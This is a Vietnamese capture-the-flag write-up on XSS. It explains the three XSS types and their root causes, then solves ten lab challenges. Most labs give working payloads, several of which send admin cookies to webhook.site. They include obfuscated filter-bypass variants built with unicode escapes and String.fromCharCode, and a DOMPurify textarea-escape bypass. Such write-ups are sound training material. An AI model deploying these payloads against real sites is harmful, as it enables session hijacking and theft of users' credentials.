# XSS

# Tổng quan

Cross-Site Scripting (XSS) là một trong những loại lỗ hổng bảo mật phổ biến trong các ứng dụng web, cho phép kẻ tấn công chèn mã độc vào trang web. Khi mã độc được thực thi trên trình duyệt của nạn nhân, kẻ tấn công có thể thực hiện các hành vi như đánh cắp thông tin nhạy cảm, giả mạo danh tính người dùng, hoặc điều hướng người dùng đến các trang web độc hại. 

Có ba loại XSS chính:

1. **Reflected XSS**: Mã độc được chèn qua các tham số trong URL và được phản hồi trực tiếp trong trang web mà không được lưu trữ.
2. **Stored XSS**: Mã độc được lưu trữ trên máy chủ và được hiển thị cho người dùng mỗi khi truy cập nội dung liên quan.
3. **DOM-based XSS**: Mã độc được thực thi thông qua việc thao túng DOM trên phía client mà không cần tương tác với máy chủ.

Lỗ hổng XSS không chỉ gây ảnh hưởng đến trải nghiệm người dùng mà còn có thể dẫn đến các cuộc tấn công nghiêm trọng hơn như leo thang đặc quyền, chiếm quyền điều khiển tài khoản, hoặc phá hoại toàn bộ hệ thống. Việc phát hiện và khắc phục lỗ hổng này là ưu tiên hàng đầu để đảm bảo an toàn cho ứng dụng web.

# Root Cause

1. **Không kiểm tra đầu vào**: Ứng dụng nhận dữ liệu từ người dùng mà không lọc ký tự nguy hiểm (`<`, `>`, `"`, `'`), tạo điều kiện chèn mã độc.
2. **Không mã hóa đầu ra**: Hiển thị dữ liệu người dùng lên trang mà không HTML encode, khiến trình duyệt thực thi mã thay vì hiển thị văn bản.
3. **Dùng hàm không an toàn**: Sử dụng các hàm như `eval()`, `innerHTML` mà không kiểm soát, dễ dẫn đến thực thi mã độc.

# LAB

## XSS-01: **XSS - Reflected**

Web này điều hướng các trang thông qua tham số `p` trên URL (`?p=home`, `?p=about`, etc.).

![image.png](Images/image.png)

Thử 1 payload XSS đơn giản

![image.png](Images/image%201.png)

Không hoạt động, và phát hiện có chỗ REPORT TO THE ADMINISTRATOR, đây là chỗ lấy flag

Mở F12→Elements check thì thấy

![image.png](Images/image%202.png)

Sau khi xác định rằng payload dạng `<script>` không hoạt động do bị render trong thẻ `<a>`, ta chuyển sang một hướng khai thác khác hiệu quả hơn: **tấn công qua các thuộc tính sự kiện (event attributes)** — điển hình là `onclick`.
Payload: `‘ onclick=’alert(1)`

![image.png](Images/image%203.png)

Thành công thoát khỏi thẻ `<a>`

![image.png](Images/image%204.png)

Khi click vào `'onclick='alert(1)` → thành công thực thi js

Payload lấy cookie admin: 

`' onclick='document.location="[https://webhook.site/1475db49-8fc1-4987-af56-03504e54ba7a?c=](https://webhook.site/1475db49-8fc1-4987-af56-03504e54ba7a?c=)"%2Bdocument.cookie`

## XSS-02: **XSS - Server Side**

Trang web với chức năng generate ra cert có chứa thông tin do người dùng nhập vào

![image.png](Images/image%205.png)

![image.png](Images/image%206.png)

Có chức năng đăng kí gồm 4 trường, thử check với payload đơn giản

![image.png](Images/image%207.png)

Đăng nhập

![image.png](Images/image%208.png)

Thử generate thì thấy được cả firstname và lastname đều có thể lợi dụng 

![image.png](Images/image%209.png)

Payload lấy flag:
`<script>x = new XMLHttpRequest();x.onload = function() {document.write(btoa(x.responseText));};x.open('GET', '/flag.txt');x.send();</script>`

Sau khi generate thì thấy 1 chuỗi base64

![image.png](Images/image%2010.png)

Decode lại để lấy flag

## XSS-03: **XSS - Stored 1**

Trang này có tính năng gửi tin nhắn và lưu lại

![image.png](Images/image%2011.png)

Thử payload vào các trường, và message chèn thẻ `<script>` thành công

![image.png](Images/image%2012.png)

Payload lấy cookie admin: `<script>fetch('https://webhook.site/a6c72a00-af24-4933-b179-479b47429209?c='+document.cookie)</script>`

## XSS-04: **XSS - Stored 2**

Thử `<script>alert(!)</script>` nhưng không thành công

![image.png](Images/image%2013.png)

Check source thì thấy dữ liệu bị **HTML encode** trước khi render
**`&lt;` và `&gt;`**  tương ứng với `<` và `>`, nên đoạn `<script>alert(1)</script>` này **không thực thi**, mà sẽ hiển thị như text thuần.

![image.png](Images/image%2014.png)

Ở đây có 1 chỗ `status: invite`, check xem có bị XSS không

![image.png](Images/image%2015.png)

Payload:  `“><script>alert(1)</script>`

![image.png](Images/image%2016.png)

Thành công thực thi js
Cách lấy flag như XSS-03

## XSS-05: **XSS - Stored - filter bypass**

<xss onfocus=document.location="https://webhook.site/333857da-efb7-48e7-93d7-f59a7b4a7883?data=".concat(document.cookie)
autofocus tabindex=1>

![image.png](Images/image%2017.png)

`<xss onfocus=\u0064\u006f\u0063\u0075\u006d\u0065\u006e\u0074.\u006c\u006f\u0063\u0061\u0074\u0069\u006f\u006e=String.fromCharCode(104,116,116,112,115,58,47,47,119,101,98,104,111,111,107,46,115,105,116,101,47,56,100,55,102,54,56,55,102,45,98,57,51,49,45,52,98,99,52,45,98,54,49,55,45,57,52,54,48,48,53,52,53,50,98,57,56,63,100,97,116,97,61).concat(\u0064\u006f\u0063\u0075\u006d\u0065\u006e\u0074.\u0063\u006f\u006f\u006b\u0069\u0065) autofocus tabindex=1>`

## XSS-06: **XSS DOM Based - Introduction**

![image.png](Images/image%2018.png)

Cho thử 1 số và xem source

![image.png](Images/image%2019.png)

Thử thoát ra khỏi biến number và chèn alert vào, ở đây đã có sẵn tag `<script>` nên bất cứ thứ gì ở trong đều được thực thi js.
Payload: `';alert(1);'`

![image.png](Images/image%2020.png)

Payload lấy cookie admin:
`'; fetch("https://webhook.site/3bef0358-33db-4a90-951a-6d0bedb6944f?c="+document.cookie);'`

## XSS-07: **XSS DOM Based - AngularJS**

![image.png](Images/image%2021.png)

→ AngularJS

![image.png](Images/image%2022.png)

Thử payload nhưng không thành công

![image.png](Images/image%2023.png)

Kí tự `'` đã bị lọc bỏ, thử `"`

![image.png](Images/image%2024.png)

Cách lấy cookie admin như bài trước

## XSS-08: **XSS DOM Based - Eval**

Chức năng tính toán bằng hàm `eval()`

![image.png](Images/image%2025.png)

![image.png](image%2026.png)

Thử thoát ra khỏi hàm nhưng không được

![image.png](Images/image%2027.png)

Hàm `eval()` có thể thực thi js trong nó
Thử payload : `1+1, alert `1``

![image.png](Images/image%2028.png)

## XSS-09: **XSS DOM Based - Filters Bypass**

![image.png](Images/image%2029.png)

Bài này tương tự XSS-06, thử dùng `';alert(1);'` để thoát khỏi biến number nhưng kí tự `;` đã bị lọc

![image.png](Images/image%2030.png)

Thử dùng toán tử điều kiện, payload `1'?alert(1):'1`

![image.png](Images/image%2031.png)

Thử payload lấy cookie: 
`1'?document.location="https://webhook.site/3bef0358-33db-4a90-951a-6d0bedb6944f?c=".concat(document.cookie):'1`

![image.png](Images/image%2032.png)

Chặn `http://` và `https://`

Payload lấy cookie admin: 
`1'?fetch('//webhook.site/3bef0358-33db-4a90-951a-6d0bedb6944f?cmd='.concat(document.cookie)):'`

## XSS-10: hamayan

Bài này ngồi mò trong vô vọng, cuối cùng lên bú writeup :)))

![image.png](Images/image%2033.png)

![image.png](Images/image%2034.png)

Tham số `message` từ URL được làm sạch bằng **DOMPurify**, rồi truyền vào template `index.ejs` qua biến `sanitized`.

![image.png](Images/image%2035.png)

Có 2 điểm chèn `<%- sanitized %>`:

- Trong thẻ `<p>`: Render thành HTML
- Trong thẻ `<textarea>`: là nơi người dùng nhập văn bản, và nội dung bên trong chỉ hiển thị dưới dạng văn bản thô.

![image.png](Images/image%2036.png)

Bắt đầu thử 1 payload đơn giản: `<script>alert(1)</script>`

![image.png](Images/image%2037.png)

**DOMPurify** đã xóa thẻ `<script>`, `sanitized` trở thành chuỗi rỗng, nên không có gì hiển thị.  

Nội dung trong `<textarea>` không được render thành HTML, mà hiển thị nguyên dạng. Nếu ta chèn `</textarea>`, trình duyệt sẽ đóng thẻ `<textarea>` sớm, phần mã sau đó sẽ thoát ra ngoài và render thành HTML.
Thử payload: `</textarea><script>alert(1)</script>`
Kết quả vẫn như trên, **DOMPurify** lại xóa `<script>alert(1)</script>` vì nó là mã nguy hiểm.

Lúc này cần phải tìm cách pypass DOMPurify

- DOMPurify không chặn `</textarea>` nếu nó nằm trong thuộc tính , vì trong bối cảnh đó nó chỉ là một chuỗi văn bản, không nguy hiểm trực tiếp. Nhưng khi chuỗi này được chèn vào `<textarea>`, nó có thể phá vỡ cấu trúc và thoát ra ngoài.

Payload: `<a id=" </textarea> <script>alert(1)</script>">test</a>`

![image.png](Images/image%2038.png)

DOMPurify thấy `<a id="...">test</a>` là HTML hợp lệ.

Kết quả: sanitized = `<a id=" </textarea> <script>alert(1)</script>">test</a>`
Khi chèn vào templat trình duyệt gặp </textarea>. Nó nghĩ rằng thẻ <textarea> kết thúc tại đó.

Phần `<script>alert(1)</script>">test</a>` thoát ra ngoài và thực thi js